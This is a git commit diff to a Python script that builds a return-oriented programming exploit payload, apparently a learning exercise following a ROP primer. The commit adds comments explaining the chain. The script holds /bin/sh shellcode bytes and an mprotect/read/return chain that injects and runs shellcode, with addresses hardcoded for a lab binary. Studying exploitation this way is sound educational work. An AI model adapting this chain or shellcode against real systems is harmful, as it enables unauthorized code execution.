e5fa0529aadf73c684fc91fb1742b9feee9312ca
bmoar <ben@rooted.systems>
2016-01-02 20:30:43 -0500

    add summary of the ROP at the top

--- fundamentals/bin/scmpayload.py
+++ fundamentals/bin/scmpayload.py
@@ -3,6 +3,19 @@
 # following along here
 # https://speakerd.s3.amazonaws.com/presentations/6486b353d27b45038d6b4286acbc9390/rop-primer.pdf
 
+'''
+tl;dr for ROP
+for f in function_to_exec():
+    push f() addr
+    push pNret where n is len(f_argv)
+    [ push f_argv[n] for n in f_argv ]
+
+tricky part is getting the intial control of the stack with the leave; ret
+and getting the shellcode into a place you can exec. I have a feeling
+you won't be able to just read() from stdin every single time, or that
+shellcode through read() might be too easy to detect and be obvious
+'''
+
 ''' shellcode
 \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 '''
@@ -63,23 +76,34 @@ we have the proper amount of padding for the leave instruction
 '''
 payload += "A"*12 # dummy
 
+'''
+At this point, we are in full control over the stack, so
+we can make our own stack frames. Chain of execution looks like this:
+
+ret; leave;
+mprotect();
+pppr();
+read();
+pppr();
+shellcode() at 0x20000000;
+'''
 # make memory section rwx
 # int mprotect(void *addr, size_t len, int prot);
-payload += p(0xf7efc0d0) # mprotect()
-payload += p(0x804855d) # pppr (pop3ret)
+payload += p(0xf7efc0d0) # mprotect(), function to call
+payload += p(0x804855d) # pppr (pop3ret) -  func to ret to manually clean up our stack frame
 payload += p(0x20000000) # mprotect argv[0] - addr to make executable
 payload += p(0x1000) # mprotect argv [1] page-aligned size
 payload += p(0x7) # mprotect argv [2] PROT|READ|PROT|WRITE|PROT_EXEC
 
 # read shellcode into buffer
 # ssize_t read(int fd, void *buf, size_t count);
-payload += p(0xf7eefbd0) # read@plt
-payload += p(0x804855d) # pppr
+payload += p(0xf7eefbd0) # read@plt, function to call
+payload += p(0x804855d) # pppr - function to ret
 payload += p(0x0) # fd = STDIN
 payload += p(0x20000000) #buf
 payload += p(0x200) # len
 
 # return to buffer with shellcode, exec it
-payload += p(0x20000000) # mprotect argv[0] - addr to make executable
+payload += p(0x20000000) # ret to first instruction of the shellcode
 
 print payload
